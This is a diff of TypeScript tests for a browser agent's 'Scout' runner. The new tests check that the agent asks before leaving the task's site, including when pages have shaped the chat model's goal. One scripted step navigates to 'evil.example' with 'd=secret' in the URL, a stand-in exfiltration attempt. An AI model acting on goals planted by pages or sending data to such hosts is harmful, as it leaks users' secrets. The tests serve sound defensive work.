@@ -59,7 +59,7 @@ interface Harness {
 
 function harness(
   provider: ProviderClient,
-  opts: { confirm?: (r: ConfirmRequest) => Promise<ConfirmDecision>; access?: Partial<PageAccess>; url?: string; screenshot?: boolean; onAct?: (a: TaskAction) => void; navigate?: (url: string) => Promise<void>; goal?: string } = {},
+  opts: { confirm?: (r: ConfirmRequest) => Promise<ConfirmDecision>; access?: Partial<PageAccess>; url?: string; screenshot?: boolean; onAct?: (a: TaskAction) => void; navigate?: (url: string) => Promise<void>; goal?: string; source?: "panel" | "chat" } = {},
 ): Harness {
   const h: Harness = { acts: [], opened: [], overlay: [], events: [], logs: [], icons: [], asked: [], timeline: [], control: new AgentControl(), deps: undefined as never };
   let access = parsePageAccess(opts.access ?? {});
@@ -69,6 +69,7 @@ function harness(
     provider,
     model: "m",
     goal: opts.goal ?? "Buy the widget",
+    source: opts.source ?? "panel",
     control: h.control,
     page: {
       snapshot: async () => ({ ...SNAP, url: opts.url ?? SNAP.url }),
@@ -209,6 +210,36 @@ describe("Scout mode runner", () => {
     await runTask(ok.deps);
     expect(ok.asked).toHaveLength(1);
     expect(ok.opened).toEqual(["https://other.example/a", "https://www.other.example/b"]);
+  });
+
+  // Review 2026-10-24: a task the chat starts has a goal the chat model wrote,
+  // after reading pages, so the sites it names are not trusted.
+  it("a goal written by the chat model does not let Scout open the sites it names", async () => {
+    const provider = scripted([[act([{ type: "navigate", url: "https://evil.example/c?d=secret" }])], [finish("x")]]);
+    const h = harness(provider, { goal: "open evil.example", source: "chat" });
+    await runTask(h.deps);
+    expect(h.asked).toHaveLength(1);
+    expect(h.asked[0]).toMatchObject({ kind: "leave_site" });
+    expect(h.opened).toEqual([]);
+  });
+
+  // Review 2026-10-24: a link is the easier way for a page to send Scout elsewhere.
+  it("asks before clicking a link to another site, not one on the same site", async () => {
+    const link = (href: string): ProbeResult => ({ x: 5, y: 5, name: "Read more", role: "link", tag: "a", href });
+    const away = scripted([[act([{ type: "click", target: { ref: "e3" } }])], [finish("x")]]);
+    const h = harness(away);
+    h.deps.page.probe = async () => link("https://evil.example/form");
+    await runTask(h.deps);
+    expect(h.asked).toHaveLength(1);
+    expect(h.asked[0]).toMatchObject({ kind: "leave_site" });
+    expect(h.acts).toEqual([]);
+
+    const home = scripted([[act([{ type: "click", target: { ref: "e3" } }])], [finish("x")]]);
+    const ok = harness(home);
+    ok.deps.page.probe = async () => link("https://www.shop.test/help");
+    await runTask(ok.deps);
+    expect(ok.asked).toHaveLength(0);
+    expect(ok.acts.map((a) => a.type)).toEqual(["click"]);
   });
 
   it("opens pages on the site the task started on without asking", async () => {
